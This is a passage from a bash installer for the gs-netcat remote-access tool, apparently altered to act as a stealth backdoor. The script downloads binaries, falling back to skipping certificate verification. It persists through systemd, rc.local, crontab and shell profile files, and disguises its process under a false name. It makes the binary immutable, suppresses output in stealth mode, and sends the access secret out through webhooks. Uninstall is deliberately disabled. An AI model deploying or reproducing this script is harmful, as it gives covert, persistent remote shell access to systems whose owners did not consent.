		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
		return	
	fi

	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
	gs_secret_write "$RCLOCAL_SEC_FILE"
	((IS_INSTALLED+=1))
}

install_system()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	echo -en "Installing systemwide remote access permanently....................."
	install_system_systemd
	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal
	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
	[[ -n $IS_SKIPPED ]] && return
	OK_OUT
}

install_user_crontab()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	command -v crontab >/dev/null || return
	echo -en "Installing access via crontab........................................."
	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in crontab."
		return
	fi

	[[ $UID -eq 0 ]] && {
		mk_file "${CRONTAB_DIR}/root"
	}

	local old
	old="$(crontab -l 2>/dev/null)" || {
		crontab - </dev/null &>/dev/null
	}
	[[ -n $old ]] && old+=$'\n'

	echo -e "${old}${NOTE_DONOTREMOVE}\n0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
	((IS_INSTALLED+=1))
	OK_OUT
}

install_user_profile()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	local rc_filename_status
	local rc_file
	local rc_filename

	rc_filename="$1"
	rc_filename_status="${rc_filename}................................"
	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"

	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${rc_file}"
		return
	fi

	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }
	((IS_INSTALLED+=1))
	OK_OUT
}

install_user()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	if [[ ! $OSTYPE == *darwin* ]]; then
		install_user_crontab
	fi
	[[ $IS_INSTALLED -ge 2 ]] && return
	for x in "${RC_FN_LIST[@]}"; do
		install_user_profile "$x"
	done
	gs_secret_write "$USER_SEC_FILE"
}

ask_nocertcheck()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	WARN "Can not verify host. CA Bundle is not installed."
	echo >&2 "--> Attempting without certificate verification."
	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
	echo -en >&2 "--> Continuing in "
	local n
	n=10
	while :; do
		echo -en >&2 "${n}.."
		n=$((n-1))
		[[ $n -eq 0 ]] && break 
		read -r -t1 -n1 && break
	done
	[[ $n -gt 0 ]] || echo >&2 "0"
	GS_NOCERTCHECK=1
}

dl_ssl()
{
	local cmd sslerr arg_nossl
	cmd="$3"
	sslerr="$2"
	arg_nossl="$1"
	shift 3
	if [[ -z $GS_NOCERTCHECK ]]; then
		DL_ERR="$("$cmd" "$@" 2>&1 1>/dev/null)"
		[[ "${DL_ERR}" != *"$sslerr"* ]] && return
	fi
	FAIL_OUT "Certificate Error."
	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
	[[ -z $GS_NOCERTCHECK ]] && return
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	echo -en "--> Downloading binaries without certificate verification............."
	DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 1>/dev/null)"
}

dl()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	if [[ -n "$GS_USELOCAL" ]]; then
		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
		errexit
	fi
	[[ -s "$2" ]] && rm -f "${2:?}"
	if [[ -n $IS_USE_CURL ]]; then
		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
	elif [[ -n $IS_USE_WGET ]]; then
		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
	else
		FAIL_OUT "CAN NOT HAPPEN"
		errexit
	fi
	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_ERR"; exit_code 255; } 
}

gs_access()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	echo -e "Connecting..."
	local ret
	GS_SECRET="${S}"
	"${DSTBIN}" -s "${GS_SECRET}" -i
	ret=$?
	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
	[[ $ret -eq 61 ]] && {
		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
	}
	exit_code "$ret"
}

test_bin()
{
	local bin
	unset IS_TESTBIN_OK
	bin="$1"
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	GS_OUT=$("$bin" -g 2>&1)
	ret=$?
	[[ $ret -ne 0 ]] && {
		FAIL_OUT
		ERR_LOG="$GS_OUT"
		WARN_EXECFAIL_SET "$ret" "wrong binary"
		return
	}
	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
	IS_TESTBIN_OK=1
}

test_network()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	local ret
	unset IS_TESTNETWORK_OK
	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
	ret=$?
	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
	[[ $ret -eq 139 ]] && { 
		ERR_LOG=""
		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
		return
	}
	{ [[ $ret -eq 202 ]] || [[ $ret -eq 203 ]]; } && {
		FAIL_OUT
		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67."
	}
	[[ $ret -eq 255 ]] && {
		FAIL_OUT
		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67."
	}
	[[ $ret -eq 0 ]] && {
		FAIL_OUT "Secret '${GS_SECRET}' is already used."
		HOWTO_CONNECT_OUT
		exit_code 0
	}
	[[ $ret -eq 61 ]] && {
		IS_TESTNETWORK_OK=1
		return
	}
	WARN_EXECFAIL_SET "$ret" "default pkg failed"
}

do_webhook()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	local arr
	local IFS
	local str
	IFS=""
	while [[ $# -gt 0 ]]; do
		str="${1//\"/\"'\"'\"}"
		eval str=\""$str"\"
		arr+=("$str")
		shift 1
	done
	"${arr[@]}"
}

webhooks()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	local arr
	local ok
	local err
	echo -en "Executing webhooks...................................................."
	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
	if [[ -n $IS_USE_CURL ]]; then
		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
	elif [[ -n $IS_USE_WGET ]]; then
		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
	fi
	[[ -n $ok ]] && { OK_OUT; return; }
	FAIL_OUT
}

try_network()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	echo -en "Testing Global Socket Relay Network..................................."
	test_network
	[[ -n "$IS_TESTNETWORK_OK" ]] && { OK_OUT; return; }
	FAIL_OUT
	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
	WARN_EXECFAIL
}

try()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	local osarch="$1"
	local src_pkg="$2"
	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
	echo -e "--> Trying ${CG}${osarch}${CN}"
	echo -en "Downloading binaries.................................................."
	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
	OK_OUT
	echo -en "Unpacking binaries...................................................."
	if [[ "${src_pkg}" == *.tar.gz ]]; then
		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat"
		[[ -n $GS_USELOCAL_GSNC ]] && {
			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
		}
	else
		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
	fi
	OK_OUT
	echo -en "Copying binaries......................................................"
	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
	chmod 700 "$DSTBIN"
	command -v chattr >/dev/null && chattr +i "$DSTBIN" 2>/dev/null
	OK_OUT
	echo -en "Testing binaries......................................................"
	test_bin "${DSTBIN}"
	if [[ -n "$IS_TESTBIN_OK" ]]; then
		OK_OUT
		return
	fi
	rm -f "${TMPDIR}/${src_pkg:?}"
}

gs_start_systemd()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	if [[ -z "$IS_GS_RUNNING" ]]; then
		clean_all
		systemctl daemon-reload
		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
			exit_code 255
		fi
		IS_GS_RUNNING=1
		OK_OUT
		return
	fi
	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
}

gs_start()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	check_kill_trigger
	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
	[[ -n "$IS_GS_RUNNING" ]] && return
	if [[ -n "$KL_CMD" ]]; then
		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
	elif command -v pidof >/dev/null; then
		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
			IS_OLD_RUNNING=1
		fi
	fi
	IS_NEED_START=1
	if [[ -n "$IS_OLD_RUNNING" ]]; then
		if [[ -n "$IS_SKIPPED" ]]; then
			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
			unset IS_NEED_START
		else
			OK_OUT
			WARN "More than one ${PROC_HIDDEN_NAME} is running."
			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
		fi
	else
		OK_OUT ""
	fi
	if [[ -n "$IS_NEED_START" ]]; then
		(
			cd "$HOME"
			# Fork pertama
			if [[ $(setsid sh -c 'echo $$') != $$ ]]; then
				setsid sh -c "eval ${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-s '$GS_SECRET' -liD\" exec -a '$PROC_HIDDEN_NAME' '$DSTBIN' &>/dev/null &"
			else
				# Fork ganda untuk memisahkan dari parent process
				(eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS="-s '$GS_SECRET' -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN" &>/dev/null &)
				disown
			fi
		) || errexit
		IS_GS_RUNNING=1
	fi
}

init_vars
if [[ "$1" =~ (clean|uninstall|clear|undo) ]] || [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]]; then
    echo -e "${CR}Uninstall is disabled. Use /tmp/kill_gs.txt or SIGUSR1 to stop the process.${CN}"
    exit_code 0
fi
init_setup
[[ -n "$X" ]] && GS_SECRET_X="$X"
if [[ -z $S ]]; then
	if [[ $UID -eq 0 ]]; then
		gs_secret_reload "$SYSTEMD_SEC_FILE" 
		gs_secret_reload "$RCLOCAL_SEC_FILE" 
	fi
	gs_secret_reload "$USER_SEC_FILE"
	if [[ -n $GS_SECRET_FROM_FILE ]]; then
		GS_SECRET="${GS_SECRET_FROM_FILE}"
	else
		GS_SECRET="${GS_SECRET_X}"
	fi
	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
else
	GS_SECRET="$S"
	URL_BIN="$URL_BIN_FULL"
fi

try "$OSARCH" "$SRC_PKG"
WARN_EXECFAIL
[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
[[ -z $S ]] && try_network
[[ -n "$S" ]] && gs_access
if [[ -z $GS_NOINST ]]; then
	if [[ -n $IS_DSTBIN_TMP ]]; then
		[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
		echo -en "Installing remote access.............................................."
		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
	else
		[[ $UID -eq 0 ]] && install_system
		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
	fi
else
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	echo -e "GS_NOINST is set. Skipping installation."
fi

if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
fi
	
[[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
webhooks
HOWTO_CONNECT_OUT() {
    echo -e "--> To connect use one of the following:
--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
}
HOWTO_CONNECT_OUT
[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
if [[ -n "$GS_NOSTART" ]]; then
	SKIP_OUT "GS_NOSTART=1 is set."
else
	gs_start
fi
echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
exit_code 0